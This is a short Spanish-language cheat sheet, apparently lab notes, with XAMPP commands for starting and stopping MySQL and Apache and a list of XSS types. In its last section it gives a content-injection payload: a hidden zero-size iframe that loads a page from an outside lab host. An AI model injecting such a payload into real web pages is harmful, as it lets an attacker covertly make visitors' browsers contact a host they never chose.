#### Iniciar y detener servicio mysql
```
c:\xampp\mysql_start.bat &
c:\xampp\mysql_stop.bat
```

#### Iniciar sesion en mysql
```
c:\xampp\mysql\bin\mysql.exe -u noroot -p
```

#### Iniciar y detener apache
```
c:\xampp\apache_start.bat
C:\xampp\apache_stop.bat
```

#### Iniciar y detener ambos servicios
```
C:\xampp\xampp_start.exe
C:\xampp\xampp_stop.exe
```

-----

### XSS
- XSS reflejado
- XSS persistente
- XSS basado en DOM

#### Content Injection
```
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> 
```
